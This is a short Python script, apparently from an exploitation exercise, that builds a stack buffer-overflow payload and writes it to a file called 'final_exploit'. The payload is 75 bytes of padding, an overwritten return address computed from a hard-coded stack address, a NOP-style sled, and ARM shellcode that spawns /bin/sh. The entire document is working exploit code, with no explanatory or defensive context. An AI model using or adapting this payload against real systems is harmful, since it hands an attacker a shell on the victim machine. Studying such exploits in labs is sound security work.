import struct

buf_addr = 0xbefff270

shellcode = (
    b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40"
    b"\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e"
    b"\x2f\x73\x68\x00"
)

offset = 75

target_addr = buf_addr + offset + 50  

payload = b"A" * offset           
payload += struct.pack("<I", target_addr)
payload += b"\x90" * 40      
payload += shellcode               

with open("final_exploit", "wb") as f:
    f.write(payload)
